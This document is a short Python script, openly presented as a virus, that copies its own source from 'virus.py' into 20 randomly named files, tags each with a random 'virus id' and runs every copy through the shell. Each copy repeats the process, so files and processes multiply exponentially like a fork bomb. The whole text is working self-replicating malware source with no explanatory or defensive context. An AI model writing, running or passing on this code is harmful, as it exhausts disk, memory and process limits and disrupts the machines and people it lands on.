import random 
import subprocess

for i in range(20):
	mystring = str(round(random.random()*1000000)) + ".py"
	fp = open(mystring,"w")
	fp_clone_virus = open("virus.py","r")
	child_virus = fp_clone_virus.read()
	
	fp.write(child_virus+"#"+"virus id:"+str(random.random()))
	fp.close()
	subprocess.run("python3 "+mystring,shell = True)
	
